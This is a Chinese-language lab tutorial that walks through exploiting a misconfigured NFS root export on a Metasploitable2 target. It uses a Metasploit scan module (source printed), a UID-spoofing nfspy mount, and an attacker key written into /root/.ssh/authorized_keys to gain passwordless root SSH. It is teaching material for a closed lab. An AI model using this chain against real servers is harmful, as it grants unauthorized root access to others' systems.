# 利用 NFS 错误配置进行攻击

## 一、实验简介

### 1.1 实验介绍

本实验主要介绍针对 NFS 共享存储错误配置情况下的攻击。通过挂载目标服务器的共享目录到本地，再写入一些信息从而获得远程访问权限。

*来自百度百科的介绍：*

> NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。

本实验利用到的当 NFS 配置错误时候，让根目录被共享并具有可写的权限，攻击机从而可以挂载整个路径并写入 `/root/.ssh/authorized_keys` 获取 root 用户对靶机的 SSH 免密码登录。

**注意：实验用的云主机因为配置成本较高，会限制次数，每个实验不超过6次**

### 1.2 实验知识点

本实验使用的环境为 Kali Linux 操作系统，一些基本的 Linux 操作命令是必须要熟悉。本实验中，我们将会涉及到的知识点有：

- msfconsole 下查看 NFS 信息
- NFS 服务错误配置的危害
- 如何利用 NFS 错误配置进行攻击
- SSH 无密码登录的设置方式

### 1.3 实验环境

实验楼采用的实验环境包含两台虚拟机，分别是攻击机和靶机：

攻击机：Kali Linux 2.0 虚拟机，主机名是 kali，IP 地址为 192.168.122.101，默认用户名密码为 root/toor
靶机：Metasploitable2 虚拟机，主机名是 target，IP 地址为 192.168.122.102，默认用户密码为 msfadmin/msfadmin

本实验在实验楼的环境下进行。在实验楼的环境中，采用的实验环境包含两台虚拟机，分别是攻击机和靶机，攻击机和靶机的账户和密码参数分别如下：

| 主机   | 主机名            | 用户名     | 密码       |
| ------ | ----------------- | ---------- | ---------- |
| 攻击机 | `Kali Linux 2.0`  | `root`     | `toor`     |
| 靶机   | `Metasploitable2` | `msfadmin` | `msfadmin` |


## 二、环境启动

### 2.1 实验环境启动

在实验桌面中，双机 Xfce 终端，打开终端，后续所有的操作命令都在这个终端中输入。

首先使用 `virsh list` 命令查看当前环境中虚拟机的列表和状态，注意需要使用 sudo，另外需要加上参数 `--all` 才会显示所有关机状态的虚拟机：


![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479890445878.png-wm)

然后我们使用 `virsh start` 命令启动虚拟机，再次查看状态虚拟机已经进入 running 状态：


![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479890565816.png-wm)

注意由于虚拟机启动需要时间，大概要等四分钟左右我们就可以使用 SSH 访问两台虚拟机了。

首先使用 SSH 连接到 Kali，我们大部分的攻击操作都需要在 Kali 虚拟机中进行，注意用户名root，密码 toor 是不显示的，使用命令 `ssh root@kali` 即可，因为当前实验环境中已经把 IP 地址和主机名的对应写入到了 `/etc/hosts` 文件中，避免输入不好记的 IP 地址：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479890676283.png-wm)

现在两台实验环境都已经启动，我们可以开始渗透测试实验了。

## 三、查看 NFS 共享目录

此处，我们可以使用多种方法获取 NFS 提供的挂载目录，最简单的是 `showmount` 命令，为了了解下获取的细节，我们使用 Kali 下的 Metasploit 框架中的 `auxiliary/scanner/nfs/nfsmount`模块。

### 3.1 扫描脚本

此次使用的攻击脚本文件为 `/usr/share/metasploit-framework/modules/auxiliary/scanner/nfs/nfsmount.rb`，注意这个目录下只有这一个脚本。我们查看该脚本的内容，并了解其中大概的扫描步骤：

*脚本路径：/usr/share/metasploit-framework/modules/auxiliary/scanner/nfs/nfsmount.rb*

```
...

# 初始化模块，名称，描述，对应的漏洞CVE索引等信息
  def initialize
    super(
      'Name'          => 'NFS Mount Scanner',
      'Description'   => %q{
        This module scans NFS mounts and their permissions.
      },
      'Author'	       => ['<tebo[at]attackresearch.com>'],
      'References'     =>
        [
          ['CVE', '1999-0170'],
          ['URL',	'http://www.ietf.org/rfc/rfc1094.txt']
        ],
      'License'	=> MSF_LICENSE
    )

    # 使用的协议是 UDP 或 TCP，通常为 UDP
    register_options([
      OptEnum.new('PROTOCOL', [ true, 'The protocol to use', 'udp', ['udp', 'tcp']])
    ])

  end

  
# 执行过程
  def run_host(ip)

    begin
      program		= 100005
      progver		= 1
      procedure	= 5

      # 配置 RPC 调用参数，默认连接 NFS 服务监听的 2049 端口
      sunrpc_create(datastore['PROTOCOL'], program, progver)
      sunrpc_authnull()
      resp = sunrpc_call(procedure, "")
    
      # 服务器信息配置
      report_service(
        :host  => ip,
        :proto => datastore['PROTOCOL'],
        :port  => 2049,
        :name  => 'nfsd',
        :info  => "NFS Daemon #{program} v#{progver}"
      )

      # 从连接返回结果中提取共享目录等信息
      # 读取信息的过程中对返回的数据进行解码才可以得到共享目录的字符串信息
      # 数据格式可以参考 NFS 协议
      exports = resp[3,1].unpack('C')[0]
      if (exports == 0x01)
        shares = []
        while XDR.decode_int!(resp) == 1 do
          dir = XDR.decode_string!(resp)
          grp = []
          while XDR.decode_int!(resp) == 1 do
            grp << XDR.decode_string!(resp)
          end
          print_good("#{ip} NFS Export: #{dir} [#{grp.join(", ")}]")
          shares << [dir, grp]
        end
        report_note(
          :host => ip,
          :proto => datastore['PROTOCOL'],
          :port => 2049,
          :type => 'nfs.exports',
          :data => { :exports => shares },
          :update => :unique_data
        )
      elsif(exports == 0x00)
        vprint_status("#{ip} - No exported directories")
      end

      sunrpc_destroy
    rescue ::Rex::Proto::SunRPC::RPCTimeout, ::Rex::Proto::SunRPC::RPCError => e
      vprint_error(e.to_s)
    end
  end

end
```

### 3.2 启动 msfconsole

在 Kali 中执行下面的命令，进入 msfconsole：

```
# 打开终端 MSF
sudo msfconsole
```

### 3.3 使用的模块

在 msfconsole 中执行后续的命令，攻击的逻辑与我们先前的实验完全一致：

1. `use` 命令使用攻击模块
2. `set` 命令配置参数
3. `show options` 查看所有参数
4. `exploit` 执行攻击

本步骤中，我们使用 `use` 命令选择 3.1 中提到的攻击脚本：

```
msf > use auxiliary/scanner/nfs/nfsmount
```

**注意：msfconsole 的提示符中增加了 `nfsmount` 信息。**

![此处输入图片的描述](https://doc.shiyanlou.com/document-uid13labid2317timestamp1480495148878.png/wm)


### 3.4 配置模块

查看并配置攻击模块必要的参数，此处需要配置的有下面几方面信息：

1. rhosts 目标服务器列表，我们配置为 target 的 IP 地址
2. threads 扫描所使用的线程数，默认为1，我们配置为5

```
msf > set rhosts 192.168.122.102
msf > set threads 5
```


最后，查看下配置信息，确认下是否准确：

```
msf > show options
```

![此处输入图片的描述](https://doc.shiyanlou.com/document-uid13labid2317timestamp1480495163777.png/wm)

### 3.5 执行扫描

开始执行，使用的是 `exploit` 命令，扫描的结果中展示了目标服务器提供的共享存储挂载信息，可以看到 `/` 被完整的提供了：

![此处输入图片的描述](https://doc.shiyanlou.com/document-uid13labid2317timestamp1480495172862.png/wm)


## 四、挂载并利用错误配置进行攻击

### 4.1 挂载目标路径

输入 `exit` 退出 msfconsole，在 Kali 的命令行下输入下面的命令挂载 NFS 共享目录到 Kali 主机上：

```
nfspy -o server=192.168.122.102:/,rw /mnt
```

这里我们使用了 [nfspy](https://github.com/bonsaiviking/NfSpy) 工具进行挂载 NFS，这个工具可以在挂载 NFS 共享目录的时候自动篡改认证信息，利用 NFS 的认证漏洞进行渗透测试。NFS 服务器根据用户 ID 来认证 NFS 共享目录上进行操作的用户，而这一点就允许一些没有授权的用户获得对挂载目录的文件读写权限。

本实验中把 nfspy 只是当作 mount 来使用，研究 nfspy 的参数，看是否有其他更强大的功能？

上述命令的参数 rw 表示可读写，`/mnt` 表示挂载到 Kali 主机的 `/mnt` 目录。

现在我们进入到 `/mnt` 目录，可以看到所有在 target 服务器上的文件。

![此处输入图片的描述](https://doc.shiyanlou.com/document-uid13labid2317timestamp1480495180539.png/wm)

### 4.2 创建攻击使用的证书

既然已经获得了文件系统的读写权限，我们可以有很多种办法创建一个后门，此处选择使用 SSH 无密码登录的方式来获得一个 SSH 连接。

SSH 服务可以使用密码登录也可以使用证书登录，证书登录的原理是将创建一组证书，包括私钥和公钥，将公钥证书传到服务器上的指定目录，在客户端使用 私钥证书就可以直接登录到服务器的 SSH 服务了。

首先我们创建一组公私钥证书，使用 `ssh-keygen` 命令，一路回车都使用默认配置就可以，创建得到的证书在 Kali 主机的 `/root/.ssh` 目录：

![此处输入图片的描述](https://doc.shiyanlou.com/document-uid13labid2317timestamp1480495187408.png/wm)

其中：

1. `id_rsa` 是私钥证书
2. `id_rsa.pub` 是公钥证书


### 4.3 设置 SSH 无密码登录

设置 SSH 无密码登录只需要将上一步骤创建的 `id_rsa.pub` 证书添加到目标服务器的 `/root/.ssh/authorized_keys` 文件的尾部即可：

![此处输入图片的描述](https://doc.shiyanlou.com/document-uid13labid2317timestamp1480495195115.png/wm)

### 4.4 连接测试

在 Kali 的命令行我们测试是否可以直接 SSH 连接靶机：

![此处输入图片的描述](https://doc.shiyanlou.com/document-uid13labid2317timestamp1480495203206.png/wm)

连接成功，不需要输入任何密码。

连接的 SSH 命令中并没有指定使用的私钥证书，是因为默认使用的证书就是 `/root/.ssh/id_rsa` ，另外我们目前是使用 root 用户无密码登录到目标主机的，如果使用其他用户则需要把公钥证书放到目标服务器其他用户的家目录 `.ssh/authorized_keys` 文件中。

## 五、总结

### 5.1 总结

本实验主要介绍针对 NFS 共享存储错误配置情况下的攻击。通过挂载目标服务器的共享目录到本地，再写入 SSH 无密码登录的证书信息从而获得远程访问权限。包含以下知识点：

- msfconsole 下查看 NFS 信息
- NFS 服务错误配置的危害
- 如何利用 NFS 错误配置进行攻击
- SSH 无密码登录的设置方式


## 六、课后作业

### 6.1 课后作业

完成以下作业，巩固实验知识：

- 本实验中把 nfspy 只是当作 mount 来使用，研究 nfspy 的参数，看是否有其他更强大的功能？
- 如何加强 nfs 服务的配置，避免被恶意利用？

对于不懂的问题，都可随时在[实验楼问答](https://www.shiyanlou.com/questions)中提出，与老师和同学一起交流。